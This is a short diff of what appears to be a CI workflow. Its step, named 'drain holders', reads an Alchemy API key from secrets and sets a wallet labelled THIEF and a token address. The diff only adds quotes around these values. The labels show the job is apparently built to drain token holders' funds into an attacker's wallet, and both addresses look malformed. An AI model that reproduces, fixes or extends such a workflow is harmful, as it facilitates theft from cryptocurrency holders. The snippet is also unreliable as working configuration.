@@ -17,5 +17,5 @@ jobs:
       - name: drain holders
         env:
           ALCHEMY_KEY: ${{ secrets.ALCHEMY_KEY }}
-          THIEF: 0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397
-          TOKEN: 0x8dCE83ECa4af
+          THIEF: "0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397"
+          TOKEN: "0x8dCE83ECa4af"
